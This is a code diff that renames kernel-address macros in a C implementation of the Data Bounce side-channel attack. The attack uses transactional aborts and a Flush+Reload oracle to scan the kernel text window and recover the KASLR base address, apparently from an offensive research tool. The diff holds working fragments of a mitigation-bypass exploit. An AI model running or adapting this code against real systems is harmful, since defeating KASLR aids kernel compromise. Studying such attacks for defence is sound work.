@@ -78,10 +78,11 @@
  * so 101 sweeps costs ~300 ms — negligible against the 30 s timeout. */
 #define DATABOUNCE_SWEEPS 101
 
-/* Scan window: uses kasld.h defines (KERNEL_TEXT_MIN, KERNEL_TEXT_MAX). */
-#define SCAN_STEP (KERNEL_ALIGN)
+/* Scan window: uses kasld.h defines (KERNEL_VIRT_TEXT_MIN,
+ * KERNEL_VIRT_TEXT_MAX). */
+#define SCAN_STEP (KASLR_VIRT_ALIGN)
 #define SCAN_SLOTS                                                             \
-  ((unsigned long)(KERNEL_TEXT_MAX - KERNEL_TEXT_MIN) / SCAN_STEP)
+  ((unsigned long)(KERNEL_VIRT_TEXT_MAX - KERNEL_VIRT_TEXT_MIN) / SCAN_STEP)
 
 /* The sentinel value written transiently to the kernel address. The
  * Flush+Reload oracle checks probe['X' * 4096]. */
@@ -115,7 +116,7 @@ static inline __attribute__((always_inline)) void xabort_wrapper(void) {
  * Data Bounce single sweep
  * =========================================================================
  *
- * Scans [KERNEL_TEXT_MIN, KERNEL_TEXT_MAX) and returns the lowest
+ * Scans [KERNEL_VIRT_TEXT_MIN, KERNEL_VIRT_TEXT_MAX) and returns the lowest
  * confirmed mapped address, or 0 if nothing was found.
  *
  * Tests each candidate address independently with DATABOUNCE_REPS
@@ -128,7 +129,7 @@ static unsigned long databounce_sweep(void) {
   for (int i = 0; i < 256; i++)
     flush(probe + i * 4096);
 
-  volatile char *buffer = (volatile char *)KERNEL_TEXT_MIN;
+  volatile char *buffer = (volatile char *)KERNEL_VIRT_TEXT_MIN;
 
   for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++) {
     /* A syscall immediately before each slot's probes brings __entry_text_start
@@ -149,7 +150,7 @@ static unsigned long databounce_sweep(void) {
       }
 
       if (flush_reload(probe + BOUNCE_CHAR * 4096))
-        return KERNEL_TEXT_MIN + slot * SCAN_STEP;
+        return KERNEL_VIRT_TEXT_MIN + slot * SCAN_STEP;
     }
 
     buffer += SCAN_STEP;
